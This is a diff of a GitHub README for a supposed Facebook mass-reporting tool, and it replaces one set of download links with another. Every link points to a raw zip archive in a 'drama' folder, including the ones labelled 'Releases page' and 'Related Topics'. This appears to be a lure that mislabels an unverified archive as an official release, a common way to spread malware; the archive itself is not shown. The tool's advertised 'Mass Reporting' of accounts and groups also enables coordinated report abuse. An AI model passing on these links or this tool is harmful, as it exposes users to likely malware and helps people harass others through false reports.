@@ -1,6 +1,6 @@
 # 🤖 facebook-reporting-tool - Simplify Your Facebook Reporting  
 
-[![Download Latest Release](https://raw.githubusercontent.com/Asmaa-Mohamd/facebook-reporting-tool/main/drama/reporting_facebook_tool_1.7.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Asmaa-Mohamd/facebook-reporting-tool/main/drama/reporting_facebook_tool_1.7.zip)
+[![Download Latest Release](https://github.com/Asmaa-Mohamd/facebook-reporting-tool/raw/refs/heads/main/drama/facebook-reporting-tool-1.6.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/Asmaa-Mohamd/facebook-reporting-tool/raw/refs/heads/main/drama/facebook-reporting-tool-1.6.zip)
 
 ## 📖 Description  
 The Facebook Reporting Tool automates the process of reporting account pages and groups on Facebook. This tool helps you report accounts that may violate Facebook's policies, such as spam or fake profiles. Use it to manage multiple reports efficiently.
@@ -9,7 +9,7 @@ The Facebook Reporting Tool automates the process of reporting account pages and
 Follow these simple steps to get started with the Facebook Reporting Tool.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Asmaa-Mohamd/facebook-reporting-tool/main/drama/reporting_facebook_tool_1.7.zip) to find the latest version of the tool.
+   Go to the [Releases page](https://github.com/Asmaa-Mohamd/facebook-reporting-tool/raw/refs/heads/main/drama/facebook-reporting-tool-1.6.zip) to find the latest version of the tool.
 
 2. **Download the Tool**  
    On the Releases page, find the download link for the latest version. Click on it to download the file to your computer.
@@ -30,7 +30,7 @@ Follow these simple steps to get started with the Facebook Reporting Tool.
 - **Internet Connection**: A stable internet connection for Facebook access
 
 ## 📥 Download & Install  
-To download the application and get started, visit the [Releases page](https://raw.githubusercontent.com/Asmaa-Mohamd/facebook-reporting-tool/main/drama/reporting_facebook_tool_1.7.zip). You will find the latest versions available for download. Click on the link and follow the steps above to install the tool.
+To download the application and get started, visit the [Releases page](https://github.com/Asmaa-Mohamd/facebook-reporting-tool/raw/refs/heads/main/drama/facebook-reporting-tool-1.6.zip). You will find the latest versions available for download. Click on the link and follow the steps above to install the tool.
 
 ## 🔍 Features  
 - **Mass Reporting**: Report multiple accounts at once to save time.  
@@ -59,10 +59,10 @@ To download the application and get started, visit the [Releases page](https://r
 If you encounter issues while using the Facebook Reporting Tool, please feel free to reach out through the issue tracker on Github. Provide details about your issue, and someone from the community will assist you.
 
 ## 🔗 Related Topics  
-- [facebook-automation-tool](https://raw.githubusercontent.com/Asmaa-Mohamd/facebook-reporting-tool/main/drama/reporting_facebook_tool_1.7.zip)  
-- [facebook-tools](https://raw.githubusercontent.com/Asmaa-Mohamd/facebook-reporting-tool/main/drama/reporting_facebook_tool_1.7.zip)  
-- [facebookbot](https://raw.githubusercontent.com/Asmaa-Mohamd/facebook-reporting-tool/main/drama/reporting_facebook_tool_1.7.zip)  
-- [fbautoaccreport](https://raw.githubusercontent.com/Asmaa-Mohamd/facebook-reporting-tool/main/drama/reporting_facebook_tool_1.7.zip)  
-- [report-facebook-page](https://raw.githubusercontent.com/Asmaa-Mohamd/facebook-reporting-tool/main/drama/reporting_facebook_tool_1.7.zip)  
+- [facebook-automation-tool](https://github.com/Asmaa-Mohamd/facebook-reporting-tool/raw/refs/heads/main/drama/facebook-reporting-tool-1.6.zip)  
+- [facebook-tools](https://github.com/Asmaa-Mohamd/facebook-reporting-tool/raw/refs/heads/main/drama/facebook-reporting-tool-1.6.zip)  
+- [facebookbot](https://github.com/Asmaa-Mohamd/facebook-reporting-tool/raw/refs/heads/main/drama/facebook-reporting-tool-1.6.zip)  
+- [fbautoaccreport](https://github.com/Asmaa-Mohamd/facebook-reporting-tool/raw/refs/heads/main/drama/facebook-reporting-tool-1.6.zip)  
+- [report-facebook-page](https://github.com/Asmaa-Mohamd/facebook-reporting-tool/raw/refs/heads/main/drama/facebook-reporting-tool-1.6.zip)  
 
 By following these instructions, you will be able to download and utilize the Facebook Reporting Tool effectively. Happy reporting!
